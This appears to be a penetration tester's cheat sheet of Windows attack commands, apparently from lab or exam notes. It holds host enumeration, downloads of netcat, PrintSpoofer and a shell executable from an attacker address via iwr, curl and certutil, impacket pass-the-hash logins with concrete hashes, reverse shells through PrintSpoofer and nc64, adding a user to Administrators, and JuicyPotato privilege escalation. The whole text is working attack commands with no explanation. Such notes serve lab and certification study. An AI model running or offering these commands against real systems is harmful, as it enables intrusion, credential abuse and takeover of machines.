Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ChildItem -Path C:\users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

--------------------------------------------------
iwr -Uri "http://192.168.45.240/nc64.exe" -Outfile nc64.exe

curl.exe http://192.168.45.240/PrintSpoofer64.exe

certutil -urlcache -split -f "http://192.168.45.240/shell.exe" 

.\agent.exe -connect 192.168.45.162:443 -ignore-cert

--------------------------------------------------
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73


impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e Mary.Williams@10.10.164.140
----------------------------------

./PrintSpoofer64.exe -c "./nc64.exe 192.168.45.240 8080 -e powershell"
./PrintSpoofer64.exe -c "./nc64.exe 192.168.45.240 443 -e cmd"
------------------------------------------------------------
net localgroup Administrators Eric.Wallows /add

---------------------------------------------------------------------------------------

.\Juicy.Potato.x86.exe -l 443 -p shell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
